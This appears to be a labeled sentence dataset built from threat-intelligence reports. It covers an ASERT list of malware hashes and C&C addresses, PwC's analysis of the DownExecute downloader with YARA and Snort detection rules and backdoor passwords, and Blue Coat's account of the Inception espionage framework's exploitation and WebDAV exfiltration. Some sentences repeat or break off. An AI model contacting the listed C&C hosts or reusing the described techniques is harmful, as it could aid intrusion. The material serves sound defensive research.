ac22aa007081caeb8970aefba7eddfcf Compilation Date : 2011 - 03 - 09 14:10:34 C&C : N / A Filename : Help statement from western U.S ? cod.scr Archive : HelpXstatementXfromXwesternXU.SX.rar ( c2d667b8072aa2eaa670d4459dd7c90d ) Dropped Files : ~$workp.doc ( 7ec4ece7358f9f67a4d583777dc1fb59 ) , ka4281x3.log , kb71271.log , WINCHAT.EXE ( 70424b91dc905e4ca5e4aeb1c62ed91f ) cd33c5467d425f662f57672531701d89 Compilation Date : 2011 - 03 - 14 02:49:22 C&C : N / A Filename : N / A Dropped Files : ~$workp.doc ( 731f288ebd8ff05b3a32377d9d7f4751 ) , WINCHAT.exe ( e62453f41af9d87b4f6d4e8223926024 ) 04908c6853cb5c9d7dccaf15fb5fd3bb Compilation Date : 2011 - 03 - 24 03:24:42 C&C : 32.114.251.129 ( US ) , 217.119.240.118 ( RS ) , 202.106.195.30 ( CN ) larry[.]yumiya[.]com Filename : N / A Dropped Files : ~$workp.doc ( 4d47f52c675db16ab1e1df5ac050d3b8 ) , ka4281x3.log , kb71271.log , WINCHAT.exe ( 47ee9a497a12272b50bb5e197935f13f ) 232b659e28c5e06ad5466c01aec35cb6 Compilation Date : 2012 - 09 - 19 08:53:14 C&C : 200.27.173.58 ( CL ) Filename : N / A Dropped Files : ka3157j.log , W3svc.exe ( 1e838fd06bcc64c54e75c527df164d91 ) 7a698acebcf19b55170f05388a2f7fe0 Compilation Date : 2012 - 10 - 12 01:21:11 C&C : N / A Filename : N / A Dropped Files : ka3158jl.log , iexplore.exe ( ac7f77cc55c964e400b8926f21bed7d2 ) 1e8fba674761371cb9e88962dcb851c0 Compilation Date : 2012 - 11 - 20 00:11:02 C&C : 211.53.164.152 ( KR ) , finance[.]yesplusno[.]com Filename : N / A Dropped Files : ~PG7953.doc ( adc0ffd684d9a986d65cb4efba39c3fe ) , ka3157jl.log , kb71271.log , iexplore.exe ( 37648553f4ee6c5cb712cca446340a9a ) 88653dde22f723934ea9806e76a1f546 Compilation Date : 2012 - 12 - 05 01:30:07 C&C : 190.193.44.138 ( AR ) , cht[.]strangled[.]net Filename : N / A Dropped Files : N / A ( this sample is a dropped backdoor ) 2b3a8734a57604e98e6c996f94776086 Compilation Date : 2012 - 12 - 05 02:13:27 C&C : 92.54.232.142 ( GE ) Filename : 補捐助案件結餘款處理調查表.doc .exe Dropped Files : ~DS5D64.doc ( 2454c4af0b839eb993dd1cbb92b2c10d ) , ka4281x3.log , conime.exe ( 3214bf22eb28e494b8e23d8ffc5ac4a9 ) 1498c9761fc819d496171c71604c2128 Compilation Date : 2012 - 12 - 11 02:26:18 C&C : N / A Filename : 部會文宣聯繫名單 cod.scr Dropped Files : ~DS5D64.doc ( e8b92d20a9c4718b4f90d27cd8cba4b3 ) , conime.exe ( 0bfb9f2080aeee22d3b4ca6fbfd25980 ) 063b6076c69ce3ba4f116d1ad51da2b5 Compilation Date : 2012 - 12 - 12 01:26:54 C&C : N / A Filename : N / A Dropped Files : ~PG7953.doc ( c4af36f64d515569816263ca48f61899 ) , ka3157jl.log , iexplore.exe ( 5b15664fb744c3f3cf7ec7b5515d2be5 ) ca838b98ca0f516858a8a523dcd1338d Compilation Date : 2013 - 07 - 25 07:48:29 C&C : 143.89.145.156 ( HK ) Filename : N / A Dropped Files : ~g4h710.doc ( 729353afd095ca07940490dbb786ee33 ) , ka4281x3.log , kb71271.log , JavaSvc.exe ( 36b42162c818cf6c2fb22937012af290 ) 986937eb4052562cdd3960dd8fffc481 Compilation Date : 2013 - 07 - 30 08:22:06 C&C : 200.42.69.140 ( AR ) Filename : N / A Dropped Files : ~g4h710.pdf ( 7cd7db8ff8071d590567c68ea0219f23 ) , ka4281x3.log , kb71271.log , JavaSvc.exe ( ee8ba3bef6a607af79405e75fb0f0d6f ) 5ef508d0ca7759ecf602192521fff287 Compilation Date : 2013 - 08 - 01 00:47:08 C&C : 200.42.69.140 ( AR ) Filename : N / A Dropped Files : ~t4hhk0.pdf ( 6b7cbcabd963ee4823dd2cd9daa5fcc7 ) , ka4281x3.log , kb71271.log , JavaSvc.exe ( ee8ba3bef6a607af79405e75fb0f0d6f ) ff5a7a610746ab5492cc6ab284138852 Compilation Date : 2014 - 03 - 04 00:19:59 C&C : 98.188.111.244 ( US ) ͧ Filename : WTO^XPiii20140303 _ slx.scr Dropped Files : ~t3fcj1.doc ( 361a6752766c154c6e31a4d9cc3a3fdc ) , kb71271.log , ka4281x3.log , JavaSvc.exe ( 82d4850a02375a7447d2d0381b642a72 ) 1ce47f76fca26b94b0b1d74610a734a4 Compilation Date : 2014 - 03 - 12 01:38:44 C&C : 133.87.242.63 ( JP ) Filename : APO EPIF 邀請函 rcs.xls Dropped Files : ~tresd2.xls ( 2e073d35934bb3920fe9907ccb7bc5f8 ) , ka4281x3.log , kb71271.log , wscnsvr.exe ( deeec10be746ecf9bf46a30bf58bc784 ) 4c703a8cfeded7f889872a86fb7c70cf Compilation Date : 2014 - 03 - 24 00:53:57 C&C : 133.87.242.63 ( JP ) Filename : 國發會 1030324 第 1 次委員會重要議題通報 finalrcs.xls Archive : .rar ( 9b42968e9a7646feb7db318713271718 ) Dropped Files : ~t3fcj1.xls ( 18dc518810892d89430a1efe2c71797e ) , ka4a8213.log , kb71271.log , serverupdate.exe ( fed7ce0d20e78b5814475d8f9d062c80 ) beb16ac99642f5c9382686fd8ee73e00 Compilation Date : 2014 - 03 - 31 07:34:00 C&C : 143.89.47.132 ( HK ) Filename : 10342 委會-審查金融法規修正草案報告 rcs.xls Dropped Files : ~tkfad1.xls ( eef5f9b46676b31a791216b42360c8bb ) , ka4a8213.log , kb71271.log , Googleupdate.exe ( e7d960060d602deb53c7d49d2002c4a4 ) 5340fcfb3d2fa263c280e9659d13ba93 Compilation Date : 2014 - 04 - 23 01:23:41 C&C : 196.1.99.15 ( SN ) , wwap[.]publiclol[.]com Filename : 報價單 Finarcs.xls Dropped Files : ~tasyd3.xls ( c5118ba47b7aa12d6524f648f1623cc1 ) , ka4a8213.log , kb71271.log , winlogdate.exe ( ba4f88fe44d02a299dbeab18c37f74f3 ) a6b4b679a51627ce279d5107c20dd078 Compilation Date : 2014 - 04 - 29 03:44:19 C&C : 59.0.249.11 ( KR ) Filename : spoolv.exe Dropped Files : N / A ( this sample is a dropped backdoor ) d444be30d2773b23de38ead1f2c6d117 Compilation Date : 2014 - 05 - 14 13:34:46 C&C : 198.209.212.82 ( US ) Filename : 1030522 新機關籌備小組清單 rcs . DOC Archive : 1030522 新機關籌備小組清單.7z ( 75193fc10145931ec0788d7c88fc8832 ) Dropped Files : ~trfai3.doc ( 196ae8d6a5d19737ae6975d047ab1d59 ) , ka4a8213.log , kb71271.log , sysupdate.exe ( 86ef188537f5e4637df24336c9b21cb0 ) b3830791b0a397bea2ad943d151f856b Compilation Date : 2014 - 05 - 14 08:16:41 C&C : 198.209.212.82 ( US ) Filename : 招標規範 Finarcs.doc Archive : 招標規範.rar ( 8629b95f9e0898793e0881a8f79ee0cf ) Dropped Files : ~taste3.doc ( aeaf1e78c2082644b122bf32803acb1f ) , ka4a8213.log , kb71271.log , spoolvs.exe ( 5eba8ced8656da865f91d5fc87e8dc74 ) [ 1 ] http://www.crowdstrike.com/blog/whois-numbered-panda/ [ 2 ] http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf [ 3 ] http://www.symantec.com/security_response/writeup.jsp?docid=2013-080921-5219-99&tabid=2 [ 4 ] https://blog.commtouch.com/cafe/malware/exe-read-backwards-spells-malware/ [ 5 ] http://threatpost.com/sirefef-malware-found-using-unicode-right-to-left-override-technique/102033 [ 6 ] http://blog.malwarebytes.org/online-security/2014/01/the-rtlo-method/ [ 7 ] http://www.fireeye.com / blog / technical/2013/08/survival - of - the - fittest - new - york - times - attackers - evolve- quickly.html [ 8 ] https://github.com/arbor/reversing/blob/master/find_byte_strings.py [ 9 ] http://www.arbornetworks.com/asert/2013/07/asert-mindshare-finding-byte-strings-using-idapython/ [ 10 ] https://www.symantec.com/security_response/writeup.jsp?docid=2014-011500-2419-99&tabid=2 [ 11 ] http://read.pudn.com/downloads199/sourcecode/windows/935255/htran.cpp__.htm The Arbor Security Engineering & Response Team ( ASERT ) at Arbor Networks delivers world - class network security research and analysis for the benefit of today 's enterprise and network operators .	0
ASERT engineers and researchers are part of an elite group of institutions that are referred to as " super remediators , " and represent the best in information security .	0
This is a reflection of having both visibility and remediation capabilities at a majority of service provider networks globally .	0
ASERT shares operationally viable intelligence with hundreds of international Computer Emergency Response Teams ( CERTs ) and with thousands of network operators via intelligence briefs and security content feeds .	0
ASERT also operates the world s largest distributed honeynet , actively monitoring Internet threats around the clock and around the globe via ATLAS , Arbor 's global network of sensors : http://atlas.arbor.net .	0
This mission and the associated resources that Arbor Networks brings to bear to the problem of global Internet security is an impetus for innovation and research .	0
To view the latest research , news , and trends from Arbor , ASERT and the information security community at large , visit our Threat Portal at http://www.arbornetworks.com / threats/.	0
pwc.blogs.com Updated Apr 27th , 2015 27 April 2015 By Tom Lancaster Follow @tlansec This short report details the techniques being used in a series of attacks mostly against Israel based organisations .	0
The decoy documents and filenames used in the attacks suggest the intended targets include organisations with political interests or influence in Israel and Palestine .	0
Although we are unable to link this campaign to any already documented in open source , it bears similarities to some described by others previously[1],[2 ] .	0
The earliest samples in the campaign we have identified date back to the summer of 2014 .	0
The number of samples discovered and relatively small scale of infrastructure suggest the attackers have limited resources with which to conduct attacks .	0
Our investigation begins by taking a look at the following file : ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9 .	0
According to the analysis published on malwr.com[3 ] , this file was originally named ' Israel Homeland Defense Directory 2015 _ Secured_.exe ' and , once executed , the following decoy document was presented .	0
The initial file in this case is a self extracting RAR file that contains three components , including a decoy document ( in this case , the PDF shown above ) and the malware .	0
Further inspection of the malware extracted showed it was n't a family our analysts recognised .	0
This , coupled with the nature of the decoy document used , led us to take a more in depth look at the malware , and associated infrastructure .	0
We 'd like to give special thanks to Eyal Sela of ClearSky Security for his collaborative efforts in this research .	0
The most common way this malware packaged is via a self extracting RAR file; however the attackers also appear to have used a number of other solutions to drop their malware , including a Visual Basic based wrapper and an Auto IT based wrapper .	0
In terms of how the malware is delivered , it 's most likely that it 's done via spearphishing .	0
For example , there are also several occasions where the VirusTotal ' ITW ' tab suggests that the original dropper was available to download on a 3rd party website .	0
In the case of the sample discussed in the introduction we can see .	0
Pomf.se is a relatively low profile file sharing / hosting website currently based in Sweden .	0
The use of Pomf.se is a relatively low profile file sharing / hosting website currently based in Sweden .	0
The use of low key file sharing sites appears to be a feature of the campaign as far as we can tell , with a few other similar sites being used in the same way .	0
This , in conjunction with the nature of the related files we have discovered ( all of them are directly executable files ) means it is likely that the malware is primarily delivered via spear phishing attempts , rather than any other method .	0
In this analysis , we 'll go over the file with a SHA256 hash of ecc240f1983007177bc5bbecba50eea27b80fd3d14fd261bef6cda10b8ffe1e9 .	0
We 've chosen to refer to the malware as ' DownExecute ' due to the .pdb string left in the malware ( leaving debug paths in malware seems to be very fashionable at the moment … ) .	0
All variants of the DownExecute ' malware we 've identified come packaged in the following fashion .	0
From the samples we have analysed so far , the decoy application included is never used by the binary , and is presumably included so that anyone taking a cursory look at the file will conclude it is in fact the real deal .	0
Whilst the cURL[4 ] binary included is used for internet connectivity but it 's currently unclear why the attackers chose to use this method of adding connectivity to their file .	0
Some of the binaries are also self signed .	0
So what can this malware do ? Not all that much – it 's just a downloader .	0
Before execution , the malware makes a couple of checks to avoid analysis , including checking for the presence of a debugger using IsDebuggerPresent as well as checking for the presence of VirtualBox by looking for the device name \\.\VBoxMiniRdrDN .	1
The malware also checks for the presence of several anti virus solutions , as well for any processes including the word ' security ' .	1
The malware then proceeds to decrypt some basic configuration data , including the command & control domain , and information about the origin of the infection , tracked via ID .	0
Meanwhile , the malware begins calling home , whilst also keeping a log of its actions in a plaintext file that is created in the same folder as where the binary was executed from .	1
It appears as though the clue for the main functionality of this malware is in its name ( it downloads , and then executes ) files , as it offers little else for the attacker .	1
The DownExecute malware is used as a way for the attackers to gain an initial foothold on the victim machine .	0
The basic information reported back by the malware would also certainly allow the attacker a way to triage infections to ensure they had reached their intended victim rather than a researcher .	1
We do n't have great visibility into post compromise activity at this stage; however there are a number of other malware samples which communicate with the same infrastructure as the DownExecute samples .	0
It 's not unreasonable to infer that if these are more fully featured backdoors , that they are likely the 2nd stage malware families used in conjunction with DownExecute .	0
Specifically , we 've observed the well documented Xtreme RAT and Poison Ivy malware families in use with the same domain names as DownExecute .	0
The Poison Ivy passwords observed for the group were ' admin2014 ' and ' admin!@#$% " .	0
The vast majority of infrastructure in terms of hostnames observed associated with these attacks have been dynamic DNS domains , primarily associated with no ip.com .	0
This provider is popular with several Middle Eastern threat actors tracked by PwC 's intelligence team .	0
In terms of the size of the infrastructure used in the campaign using the tools described , it 's also fairly small , as shown on our Maltego graph .	0
The attackers have made an unusual choice with respect to the hosting providers used for the malicious infrastructure .	0
Most of the domains at the time of writing , and indeed historically , have pointed to IP address space owned by Host Sailor , geo located in Belize .	0
Many of the threat actors in the Middle East that we 're familiar with have extremely volatile IP hosting , owing to the fact that the infrastructure is likely to be hosted on their own networks .	0
This remote hosting therefore somewhat bucks the trend of some of to be hosted on their own networks .	0
This remote hosting therefore somewhat bucks the trend of some of the other actors we see from the region .	0
As we have mentioned in a number of our other reports[5 ] , attackers often use C&C domains which contain phrases relevant to their targets so as to make them appear legitimate .	0
With this in mind we performed some simple analysis on the domain names used in this campaign to identify legitimate organisations being impersonated .	0
For a full list of C&Cs used , please see Appendix B.	0
As shown , there appears to be a theme here , with a number of Israeli news organisations being used as C&C themes and hence probably being targeted .	0
So do we believe this campaign is focused only at Israeli companies ? Perhaps not entirely .	0
Whilst there are a number of documents clearly aimed at Israeli nationals , using political and military themes , one of the lures[6 ] included an Arabic language decoy document pictured below .	0
The document in question discusses an alleged leak of information relating to Abbas , leader of the Palestine Liberation Organization .	0
Whilst this is a subject which is clearly of key interest to all parties in the region , the fact the attackers sent an Arabic language version of the story may indicate that the recipient was expected to be fluent in Arabic , and possibly therefore less likely to be Israeli , but rather someone from another adjacent region .	0
Whilst , in this case , we 're unable to attribute this set of activity to a specific group or entity in the Middle East , it does bear a significant resemblance to many attacks seen from the Middle East that have been previously documented .	0
Specifically , the following aspects of this campaign remind us of existing write ups on Middle Eastern campaigns .	0
The fact that the attackers chose to develop their own dropper may be indicative that their biggest problem when conducting network intrusions is getting their foot in the door – particularly as it seems as though they still prefer the more fully featured Poison Ivy and Xtreme RAT backdoors as 2nd stage malware families .	0
When we pivoted and looked for the earliest examples of the DownExecute malware , the first samples we could find were compiled in June 2014 .	0
We have no reason to believe in this case that the threat actor has tampered with the compile time on any samples , as all other samples discovered were identified shortly after they were compiled .	0
As such we believe the campaign using this downloader malware has been on going for approximately 12 months .	0
SHA256 rule DownExecute_A meta .	0
author = " PwC Cyber Threat Operations : : @tlansec " date = " 2015 04 " reference = " http://pwc.blogs.com/cyber_security_updates/2015/04/attacks against israeli palestinia n interests.html " description = " Malware is often wrapped / protected , best to run on memory " strings .	0
$ winver1 = " win 8.1 " $ winver2 = " win Server 2012 R2 " $ winver3 = " win Srv 2012 " $ winver4 = " win srv 2008 R2 " $ winver5 = " win srv 2008 " $ winver6 = " win vsta " $ winver7 = " win srv 2003 R2 " $ winver8 = " win hm srv " $ winver9 = " win Strg srv 2003 " $ winver10 = " win srv 2003 " $ winver11 = " win XP prof x64 edt " $ winver12 = " win XP " $ winver13 = " win 2000 " $ pdb1 = " D:\\Acms\\2\\docs\\Visual Studio 2013\\Projects\\DownloadExcute\\DownloadExcute\\Release\\DownExecute.pdb " $ pdb2 = " d:\\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\writer.h " $ pdb3 = " : \\acms\\2\\docs\\visual studio 2013\\projects\\downloadexcute\\downloadexcute\\downexecute\\json\\rapidjson\\internal / stack.h " $ pdb4 = " \\downloadexcute\\downexecute\\ " $ magic1 = " < Win Get Version Info Name Error " $ magic2 = " P@$sw0rd$nd " $ magic3 = " $ t@k0v2rF10w " $ magic4 = " |*|123xXx(Mutex)xXx321|*|6 21 2014 03:06PM " wide $ str1 = " Download Excute " ascii wide fullword $ str2 = " EncryptorFunctionPointer % d " $ str3 = " % s\\%s.lnk " $ str4 = " Mac:%s Cpu:%s HD:%s " $ str5 = " feed back responce of host " $ str6 = " GET Token at host " $ str7 = " dwn md5 err " condition .	0
all of ( $ winver * ) or any of ( $ pdb * ) or any of ( $ magic * ) or 2 of ( $ str * ) Network IDS alert http any any > any any ( msg : " [ PwC CTD ] Unclassified Middle Eastern Actor DownExecute URI ( /dw / gtk)"; flow : established , to_server; urilen:7; content:" / dw / gtk"; http_uri; depth:7; content:"GET " ; http_method; content:!"User Agent:"; http_header; content:!"Referer:"; http_header; http_method; content:!"User Agent:"; http_header; content:!"Referer:"; http_header; reference : md5,4dd319a230ee3a0735a656231b4c9063; classtype : trojan activity; metadata : tlp WHITE , author @ipsosCustodes; sid:99999901; rev:2015200401; ) alert http any any > any any ( msg : " [ PwC CTD ] Unclassified Middle Eastern Actor DownExecute URI ( /dw / setup)"; flow : established , to_server; urilen:>8; content:" / dw / setup"; http_uri; depth:9; content:"POST " ; http_method; reference : md5,4dd319a230ee3a0735a656231b4c9063; classtype : trojan activity; metadata : tlp WHITE , author @ipsosCustodes; sid:99999902; rev:2015200401; ) alert http any any > any any ( msg : " [ PwC CTD ] Unclassified Middle Eastern Actor DownExecute Headers"; flow : established , to_server; urilen:>7; content:"Accept * /*"; http_client_body; content:"Content Type : multipart / form data\; boundary= " ; http_header; content : " ci_session="; http_cookie; depth:11; content : " POST"; http_method; content:!"Referer:"; http_header; content:!"User Agent:"; http_header; reference : md5,4dd319a230ee3a0735a656231b4c9063; classtype : trojan activity; metadata : tlp WHITE , author @ipsosCustodes; sid:99999903; rev:2015200401; ) Evernote makes it easy to remember things big and small from your everyday life using your computer , tablet , phone and the web .	0
Terms of Service Privacy Policy	0
Blue Coat researchers have uncovered a previously-undocumented , highly automated , and extremely sophisticated framework for performing targeted attacks .	0
The framework is notable for a number of reasons , including ( but not limited to ) its use of a cloud-based infrastructure for command-and-control and its use of the WebDAV protocol to send instructions and receive exfiltrated information from compromised systems .	1
Initial malware components were embedded in Rich Text Format ( RTF ) files .	0
Exploitation of vulnerabilities in this file format is leveraged to gain remote access to victim 's computers .	1
The framework , thus far , has been using the services of a cloud service provider based in Sweden , CloudMe.com , for its main command-and-control infrastructure .	1
Malware payloads designed for a wide array of potential devices , including home routers and mobile devices running iOS , BlackBerryOS or Android , were also recovered during the course of our research .	0
The framework is designed in such a way that all post-infection communication ( i.e . target surveying , configuration updates , malware updates , and data exfiltration ) can be performed via the cloud service .	1
The malware components of this framework follow a plugin model , where new malware rely on other , previously delivered malware components to interact with the framework .	0
Initial attacks were largely focused on Russia and a few other Eastern European countries .	0
However , we have later seen that attackers are interested in targets all over the globe .	0
The framework is itself target-agnostic , and seems highly automated .	0
The operational security exhibited by the attackers is very good - among the best we have seen .	0
Most interaction between attackers and their infrastructure is performed via a convoluted network of router proxies and rented hosts .	1
Although the attackers have left a few clues , we have been unable to provide attribution with any degree of accuracy .	0
The use of software vulnerabilities in order to execute malicious software on unsuspecting users ' computers is an important parameter to monitor .	0
This method of attack is not only known to have a considerable success rate , it is also often deployed by resourceful attackers and , as such , marks a threat worth paying attention to .	0
The use of exploits in document formats like PDF , DOC and RTF is in some ways especially noteworthy .	0
Documents are commonly exchanged via mail , which make them perfect for email-borne targeted attacks ; what is otherwise known as spear phishing .	0
In March , 2014 , Microsoft published information about a new vulnerability in Rich Text Format ( RTF ) .	0
This vulnerability , named CVE-2014-1761 ( Microsoft Word RTF Object Confusion ) , had already been used effectively by attackers at the time of the announcement .	0
Two previous vulnerabilities in the RTF file format , known as CVE-2010-3333 and CVE-2012-0158 , had become , by that time , mainstays of targeted attacks , so we tracked how attackers implemented this new exploit with keen interest .	0
By late August , we identified a malware espionage operation that used both the CVE-2014-1761 and CVE-2012-0158 vulnerabilities to trigger execution of the malicious payload , and which leveraged a single cloud service as the backbone of its entire visible infrastructure .	0
When we examined the suspicious documents , it was discovered that they were somewhat anomalous compared to the run-of-the-mill material .	0
They turned out to belong to a highly advanced and professional targeted attack framework , which utilized a complex series of techniques to survey potential targets .	1
Due to the many levels of obfuscation and indirection , we named this the Inception framework ; but there ends all similarity with the movie by the same name .	0
Leonardo DiCaprio is not associated with this investigation .	0
We initially knew little about who the actual targets were ; apart from one .	0
In that particular case we had the actual phishing email , so we knew the apparent recipient – the CEO of a large Russian bank .	1
The email was apparently sent from '' Mrs. World '' ; note the Mrs. , and not Miss - World .	0
We soon discovered that our malware repository contained several other , similar documents , but these had come from other sources which did not include the email message , or any identifiable information about the targets .	0
However , the text of the documents covered a variety of topics mostly revolving around Russian issues relating to a variety of business sectors .	0
The following pages highlight a representative selection of these documents .	0
All documents that we have found so far have been rather standard Word documents , of the old 97-2003 compatible format based on OLE2 .	0
Such documents can , and typically do , contain quite a bit of metadata : The name of the document creator ; the user who edited it most recently ; the name of the company whose copy of Word was used to create the document , et al .	0
Users can optionally configure Word to remove this metadata when a document is saved , and that 's exactly what the creator of these documents did , stripping out this potential source of attribution data .	0
However , Word documents in this format contain additional information , if you know where to look .	0
All Word documents of this format contain what 's known as a File Information Block ( FIB ) .	0
The FIB contains information about the file 's internal structure , and also – to some extent – data on the program used to create the file .	0
In the case of the samples we analyzed , all of the documents were saved using the same build of Microsoft Word from Office14 ( better known as Office 2010 ) .	0
In addition , documents can contain slack space in which old data remains .	0
For example , the decoy that came with the attack named '' Organigrama Gobierno Rusia.doc '' contains Visual Basic leftovers indicating that it originally was created on a computer that was configured to be used by a native Spanish speaker , apparently by an advisor at the Spanish Embassy in Moscow .	0
This document was presumably obtained by the attackers and repurposed for the attack .	1
Despite the limited information at our disposal about the targets of these attacks , their content reveals some context about who the possible targets may have been .	0
First of all , we have the decoy documents which indicate an interest in : We also have a set of phishing mails , which were targeted at : The shellcode used is a pretty standard variant previously used by a number of campaigns typically operating out of China , but with some minor changes .	1
The malicious content is stored inside the document in encoded form , and the shellcode decodes and writes this to disk .	1
Upon successful execution this code drops a Word document and a Visual Basic script .	1
The Word document is displayed to the user to avoid arousing any suspicion while the script is executed in the background .	1
Unusual for many exploit campaigns , the names of the dropped files vary ; for example HyHa9AJ.vbs , ewRg.vbs , 0QHdN.vbs , etc .	1
– clearly randomized in order to avoid detection by name .	1
The VBScript dropper code is also a little unusual .	0
It declares a Windows Management Instrumentation ( WMI ) object in order to reach components like the registry and file system .	0
This seems adapted from Microsoft example code , like the one found at http : //msdn.microsoft.com/en-us/library/aa387236 ( v=vs.85 ) .aspx	0
When the VBSript is run it drops two files to disk .	1
One is a polymorphed dll file and the other a binary data file with no obvious internal structure .	0
This data file turns out to be encrypted using AES-256 .	1
The files will be installed in several locations : These locations will vary some between operating system versions .	1
The VBScript then sets a startup key in the '' HKCU\Software\Microsoft\Windows\CurrentVersion\Run '' registry path to execute the DLLs at boot time .	1
Regardless of whether the registry launches the DLL or when another malware executable starts the DLL directly , the DLL is launched using regsrv32.exe with the /s ( silent ) option .	1
The names of these dropped files change from attack to attack .	0
The one above drops ctfmonrc.dll .	1
Other names observed were : The encrypted data files are named using random words apparently taken from a dictionary – '' acholias '' , '' arzner '' , '' bicorporate '' , '' crockrell '' , '' damnatorily '' etc .	0
Looking at one of the dropped dlls we can see the authors originally called it 95Num3P3gm.dll.polymorphed.dll .	0
When executed it will rebuild the original dll ( 95Num3p3gm.dll , presumably ) , load it from memory and pass over execution .	1
It is hard to describe the polymorphed dlls with any real depth , as there is little consistency between them .	0
When two nearly identical dlls are encoded using the polymorphic scheme there is very little code in common .	0
The call graphs are different and key functions have varying number of arguments .	0
The polymorphing mechanism also generates , and inserts , unique functions all of which make calls to different floating-point operations – all done just to obfuscate the actual decoding process .	1
The sizes of buffers allocated are also randomized to mask their intent .	0
What is common is that somewhere along the execution cycle is one extremely large function ( over 200 kb in length ) where early in a large allocation is made where the un-obfuscated binary will be placed .	0
The binary is then built from de- obfuscating segments of it that have been dispersed through the '.rdata ' section .	0
The order , size , and locations of these segments vary from build to build but somewhere near the end of the large function there will be a call to a subfunction that loads the PE image into memory , followed by a call to free the PE image allocation from memory .	1
Simply halting execution before this function call permits a researcher to extract the reconstructed DLL from memory .	0
Here , pausing execution before the call to 'loadpefrommemory ' reveals the extracted PE at the memory address pointed to by edx .	0
This reconstructed DLL , once loaded , will decode a configuration structure from its '.data ' section which contains three important details : the name of the encrypted data file dropped by the VBScript ; the AES key used to decrypt the file ; and the name of a unique global mutex to hold while running to prevent multiple instances .	0
This configuration information is used to load the encrypted file into memory and decrypt it .	1
This turns out to be yet another dll .	0
The first ordinal exported by this dll is located and then called , passing in the configuration and the name of the encrypted file on disk as parameters .	0
This last dll is the heart of the threat ( originally called q5Byo.dll in this instance .	0
This file contains the true intent of this campaign .	0
It is designed as a survey tool .	1
The PE file gathers system information including OS version , computer name , user name , user group membership , the process it is running in , locale ID 's , as well as system drive and volume information .	1
All of this is encrypted and then sent to cloud storage via WebDAV .	1
WebDAV is a communication standard that allows file management over HTTP or HTTPS .	0
Windows allows WebDAV sessions to be mapped as network resources .	0
The use of WebDAV as the communication channel is atypical for most malware samples we see .	0
By using a network resource , the actual web traffic originates from the system itself , and not from the process in which the malware resides .	0
Additionally , once the resource is established , the malware can transfer files to and from the command and control servers using standard file IO commands .	1
All the authentication information for the WebDAV session including the URL , folders , path , user name , and password is stored within this last DLL in another AES-encrypted configuration structure in the binary .	0
A unique path , username , and password were used for each malware instance we 've seen in the wild .	0
This allows the attackers to uniquely identify every targeted attack and track how successful each phishing campaign is .	1
Also contained within the configuration structure is information on how to name the survey data on the remote file server .	0
The binary reads from its configuration a string on how to generate the remote filename , and a list of extensions to use .	0
An example would be '' 1-7d0-8s '' , [ '' TIF '' , '' TAR '' , '' SIT '' ] which instructs the binary to generate a filename with 1 to 7 numeric digit characters followed by 0 to 8 ASCII letters with one of the three listed extensions such as '' 664gher.TAR '' .	0
The survey is then uploaded to the server in a specified folder with the generated name .	1
Files are compressed using a modified LZMA-compression and encrypted using AES cipher-block-chaining ( CBC ) before being uploaded to the cloud server .	1
The binary also checks a separate folder on the cloud service designated to contain new configuration information .	1
If such a file is present on the server , the malware downloads the new configuration file then deletes it from the server .	1
The cloud storage provider in every case we have seen was the Swedish company CloudMe.com , which offers free and paid WebDAV cloud storage .	0
The URI model used by the malware is http : //webdav.cloudme.com/ % username % /CloudDrive/ which is a direct reference to file storage .	0
It must be noted that the CloudMe service is not actively spreading the malicious content ; the attackers are only using it for storing their files .	0
We notified CloudMe.com about the abuse of their services .	0
Their CEO , Mr. Daniel Arthursson , was none too happy about this , and was very helpful in our further research .	0
CloudMe has shared a great deal of log information related to this attack .	0
These indicate that there are many other accounts ( over 100 ) likely related to this attack system .	0
We have no way of verifying this with absolute certainty , but this is what we regard as a high confidence assumption .	0
The cloud accounts are not used for one-way communication only .	0
The malware also checks configured subfolders for updates ; and if these are found they will be downloaded , decrypted and used as appropriate .	1
One such case is the franko7046 account , used against the previously mentioned bank CEO .	0
In this account there was hidden another encrypted configuration file which the malware downloaded and decrypted .	1
This is how we found the depp3353 account .	0
In this new account there was another surprise waiting for us – a download folder with two new encrypted files , 921.bin and 922.bin .	0
Once decrypted , these turned out to be PE executables .	0
The two new executables are plugins - quite similar to each other and obviously compiled on the same setup .	0
They are lightweight and intended to pull specific survey information from their target .	1
Of interest , both of the DLLs originally had the same internal name ( 78wO13YrJ0cB.dll ) .	0
Presumably the same PE sanitization script and parameters were used on both .	0
None of these plugins contain any means of CnC communication .	0
Instead , when they are executed they are passed a pointer to a function to use for sending data back home .	1
Neither are they ever written to disk .	0
They are executed in memory only , and once they have completed the memory is freed .	1
This makes these modules extremely stealthy , flexible and compatible with multiple toolsets independent of what CnC method is being used .	0
921.bin retrieves several datapoints about the infected machine : Domain info ; a list of running processes with all loaded modules in each ; the list of installed software ; and a complete hardware profile of the target machine .	1
922.bin compiles a dirwalk – a complete listing of every file path – of each fixed drive .	1
All of this information is exfiltrated back via the same WebDAV connection .	1
This model makes it possible to do the intrusion in steps , with verification stages in between ; and the files will not be easily found on affected computers .	0
Based on the information gathered from these modules , the attackers appear to move to the next stage of their attack by placing more new components on the WebDAV shares .	0
Information about these uploads is limited by the fact that we do not have the AES keys to decrypt much of the uploaded data , but we have been able to see some upload patterns .	0
What we assume to be third-stage plugins appear on the shares as *.bin files of roughly 72kb .	0
As with other plugins , these are downloaded and deleted from the share in one go .	1
However , the next day , another *.bin file of the same size will be uploaded to the share .	0
This is a pattern that repeats itself over all live accounts .	0
It seems that because the plugins exist in memory only , they are injected daily to ensure persistence on victim computers .	1
Our theory is that this malware is a more typical datastealer , and we have observed that after this type of file is planted on the account , encrypted data uploads from compromised users increase .	1
Victims of this attack will connect using the Windows WebDAV redirector , and the HTTP request user-agent string will reflect this .	1
For Windows XP this will typically be '' Microsoft-WebDAV-MiniRedir/5.1.2600 '' , and for Windows 7 a common user-agent is '' Microsoft-WebDAV-MiniRedir/6.1.7601 '' .	0
Security researchers – and there are a few of them - connect in a variety of ways ; first of all , we see a number of connections that are indistinguishable from the way victims connect .	0
This happens when researchers use lab machines with live internet access to run the malware .	0
The only way we can tell these are researchers is because they connect from IP address ranges that are unlikely to be victims ; and they also tend to consist of short-lived sessions .	0
Some researchers set up scheduled tasks to scan the shares for new updates and malware .	0
We see a few variations of these – one typical configuration is where the requests contain a Python-related user-agent string .	0
